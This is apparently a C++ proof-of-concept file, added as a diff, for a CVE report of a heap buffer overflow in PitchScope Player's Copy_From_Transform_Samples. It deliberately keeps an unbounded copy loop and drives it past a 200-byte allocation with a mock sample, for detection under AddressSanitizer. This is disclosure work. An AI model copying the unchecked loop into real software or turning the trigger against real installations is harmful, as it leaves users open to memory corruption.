@@ -1,0 +1,189 @@
+/*
+PoC for CVE submission: Heap Buffer Overflow (CWE-787)
+Product: PitchScope Player
+Vulnerable Function: BitSourceStatic::Copy_From_Transform_Samples() in BitSourceAudio.cpp
+
+Notes for CNA:
+This is a minimal source-level reproduction harness.
+Original code is written for Windows/MFC; this stub removes stdafx.h / MFC / winmm dependencies
+while preserving the vulnerable loop logic EXACTLY as present in PitchScope Player source.
+The bug: No bounds check to verify total written bytes <= allocated m_totalBytes.
+Trigger: SndSample with attacker-controlled large Get_Length() return value.
+CENTEREDj branch writes 4 bytes per sample.
+Test case: allocate 200 bytes, supply 60 samples ¡ú 60*4=240 bytes written ¡ú heap overflow.
+Compile: clang++ -g -fsanitize=address -fno-omit-frame-pointer poc_cve_submit.cpp -o poc_cve_submit
+Run: ./poc_cve_submit
+*/
+
+#include <cstdlib>
+#include <cstdio>
+#include <cstring>
+
+typedef long LONG;
+
+// ---------------------- SndSample abstract base class (matches original interface) ----------------------
+class SndSample
+{
+public:
+    virtual long Get_Length() = 0;
+    virtual char* Get_StartByte() = 0;
+    virtual char* Get_StartByte_RightStereo() = 0;
+    virtual bool Is_Stereo_Sample() = 0;
+};
+
+// ---------------------- TransformMap channel constants ----------------------
+namespace TransformMap {
+    const short LEFTj         = 0;
+    const short RIGHTj        = 1;
+    const short CENTEREDj     = 2;
+    const short SEPARATEstereo= 3;
+}
+
+// ---------------------- BitSourceStatic with vulnerable function ----------------------
+class BitSourceStatic
+{
+public:
+    char* m_staticBits = nullptr;
+    long  m_totalBytes = 0;
+    bool  m_usingSecondaryBuffer = false;
+
+    bool Create_Secondary_Buffer(long byteCount)
+    {
+        if (m_staticBits != nullptr)
+        {
+            free(m_staticBits);
+            m_staticBits = nullptr;
+            m_totalBytes = 0;
+        }
+        m_staticBits = static_cast<char*>(malloc(byteCount));
+        if (m_staticBits == nullptr)
+        {
+            return false;
+        }
+        m_usingSecondaryBuffer = true;
+        m_totalBytes = byteCount;
+        return true;
+    }
+
+    char* Get_Start_Byte()
+    {
+        return m_staticBits;
+    }
+
+    // VULNERABLE FUNCTION: Direct port of original PitchScope Player code
+    bool Copy_From_Transform_Samples(SndSample& srcSndSample, short channelCode, char* retErrorMesg, size_t errBufSize)
+    {
+        long totalSamples = srcSndSample.Get_Length();
+        char* dest = Get_Start_Byte();
+        char* src = srcSndSample.Get_StartByte();
+        char* srcRight = nullptr;
+
+        if (channelCode == TransformMap::SEPARATEstereo)
+        {
+            if (!srcSndSample.Is_Stereo_Sample())
+            {
+                snprintf(retErrorMesg, errBufSize, "missing channelCode case");
+                return false;
+            }
+            srcRight = srcSndSample.Get_StartByte_RightStereo();
+        }
+
+        if (channelCode == TransformMap::LEFTj)
+        {
+            for (long k = 0; k < totalSamples; k++)
+            {
+                *dest = 127; dest++;
+                *dest = *src; dest++;
+                src++;
+            }
+        }
+        else if (channelCode == TransformMap::RIGHTj)
+        {
+            for (long k = 0; k < totalSamples; k++)
+            {
+                dest++;
+                dest++;
+                *dest = 127; dest++;
+                *dest = *src; dest++;
+                src++;
+            }
+        }
+        else if (channelCode == TransformMap::CENTEREDj)
+        {
+            // ===== VULNERABLE LOOP: NO BOUNDS CHECK =====
+            for (long k = 0; k < totalSamples; k++)
+            {
+                *dest = 127; dest++;
+                *dest = *src; dest++;
+                *dest = 127; dest++;
+                *dest = *src; dest++;
+                src++;
+            }
+        }
+        else if (channelCode == TransformMap::SEPARATEstereo)
+        {
+            for (long k = 0; k < totalSamples; k++)
+            {
+                *dest = 127; dest++;
+                *dest = *src; dest++;
+                *dest = 127; dest++;
+                *dest = *srcRight; dest++;
+                src++;
+                srcRight++;
+            }
+        }
+        else
+        {
+            snprintf(retErrorMesg, errBufSize, "missing channelCode case.");
+            return false;
+        }
+        return true;
+    }
+};
+
+// ---------------------- Attacker-controlled mock SndSample ----------------------
+class MockSndSample : public SndSample
+{
+public:
+    long m_fakeLen;
+    char* m_pSrc;
+    char* m_pSrcRight;
+
+    long Get_Length() override { return m_fakeLen; }
+    char* Get_StartByte() override { return m_pSrc; }
+    char* Get_StartByte_RightStereo() override { return m_pSrcRight; }
+    bool Is_Stereo_Sample() override { return true; }
+};
+
+// ---------------------- Main PoC entry ----------------------
+int main()
+{
+    BitSourceStatic bs;
+    char errBuf[256] = {0};
+
+    // Allocate 200-byte heap buffer
+    if (!bs.Create_Secondary_Buffer(200))
+    {
+        printf("Create_Secondary_Buffer failed\n");
+        return 1;
+    }
+
+    MockSndSample maliciousSample;
+    char srcBuf[1024] = {0};
+    maliciousSample.m_fakeLen = 60;     // 60 samples ¡Á4 bytes = 240 bytes > 200 ¡ú overflow
+    maliciousSample.m_pSrc = srcBuf;
+    maliciousSample.m_pSrcRight = srcBuf;
+
+    bool ret = bs.Copy_From_Transform_Samples(maliciousSample, TransformMap::CENTEREDj, errBuf, sizeof(errBuf));
+    if (!ret)
+    {
+        printf("Copy_From_Transform_Samples returned false, error: %s\n", errBuf);
+    }
+    else
+    {
+        printf("Function returned true; ASAN will trigger heap-buffer-overflow WRITE\n");
+    }
+
+    return 0;
+}
+
